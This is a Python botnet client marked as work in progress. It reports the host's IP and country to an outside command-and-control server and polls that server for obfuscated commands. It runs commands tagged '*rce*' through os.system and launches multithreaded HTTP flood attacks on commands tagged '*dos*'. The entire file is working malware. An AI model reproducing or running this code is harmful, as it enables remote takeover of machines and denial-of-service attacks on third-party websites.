######################
# WIP
######################
import base64
import time
import requests
import os
from os import system, name
import json
import html
import threading
import random
import sys

cnc_server = "https://net.cloudcant.repl.co"


def getinfo(type):
  response = requests.get('http://ifconfig.net/json')
  infojson = html.unescape(response.text)
  info = json.loads(infojson)
  return info[type]


botinfo = f"{getinfo('ip')}@{getinfo('country')}"
requests.get(f"{cnc_server}/bot?connect={botinfo}")


def clear():
  # for windows
  if name == 'nt':
    _ = system('cls')
  # for mac and linux(here, os.name is 'posix')
  else:
    _ = system('clear')


def b64_encode(input):
  input_ascii = input.encode("ascii")
  input_b64_raw = base64.b64encode(input_ascii)
  input_b64 = input_b64_raw.decode("ascii")
  return input_b64


def b64_decode(string):
  string_ascii = string.encode("ascii")
  string_decoded_raw = base64.b64decode(string_ascii)
  string_decoded = string_decoded_raw.decode("ascii")
  return string_decoded


def reverse(input):
  return input[::-1]


def encode(string):
  step1 = b64_encode(string)
  step2 = reverse(step1)
  output = b64_encode(step2)
  return output


def decode(string):
  step4 = b64_decode(string)
  step5 = reverse(step4)
  output = b64_decode(step5)
  return output


def getcommand():
  global cnc_server
  cnc = requests.get(f"{cnc_server}/bot")
  command = html.unescape(cnc.text)
  return command


def getcheck():
  cnc_check = requests.get(f"{cnc_server}/bot?check")
  check = html.unescape(cnc_check.text)
  return check


def log(check):
  global command
  command = getcommand()
  clear()
  print(f"""
  {botinfo}
  ├── {cnc_server}/bot
  │   ├── {encode(command)}
  │   └── {decode(command)}
  ├── {cnc_server}/bot?check
  │   ├── {encode(check)}
  │   └── {check}\n""")


def dos(host, reqs, threadc):
  print(f"""
  {botinfo}
  ├── DOS
  │   ├── {host}
  │   ├── {reqs}
  │   └── {threadc}\n""")

  t = 0
  threadcount = 0
  threads = int(threadc)
  views = int(reqs)
  sendurl = str(host)

  def main():
    reqcount = round(views / threads)
    URL = "https://raw.githubusercontent.com/cloudcant/useragents/main/Useragents.txt"
    response = requests.get(URL)
    open("Useragents.txt", "wb").write(response.content)
    lines = open('Useragents.txt').read().splitlines()
    myline = random.choice(lines)

    user_agent = {'User-agent': myline}
    print(f"> Loaded UserAgent On Thread")
    i = 0
    sent = 0

    while i < (views / threads):
      i = i + 1
      sent = sent + 1
      reqcount = reqcount
      response = requests.get(sendurl, headers=user_agent)
      print(
        f"> Thread | Target Requests: {views} | Current Thread Requests: {sent}/{reqcount} "
      )

  if t == 0:
    for i in range(threads):
      threading.Thread(target=main).start()
      threadcount = threadcount + 1
      print(f"> Thread loaded | {threadcount}/{threads}")

  print(f"> {threads} Threads Loaded")


while True:
  status = decode(getcheck())
  if status == "listen":
    log("Listen")
    if "*rce*" in decode(command):
      os.system(str((decode(command)).replace('*rce*', '')))
    elif "*dos*" in decode(command):
      host, reqs, threads = (str((decode(command)).replace('*dos*',
                                                           ''))).split("::")
      dos(host, reqs, threads)
    else:
      pass
    time.sleep(2)
  elif status == "off":
    log("Off")
    time.sleep(2)
  else:
    log("err")
    time.sleep(2)
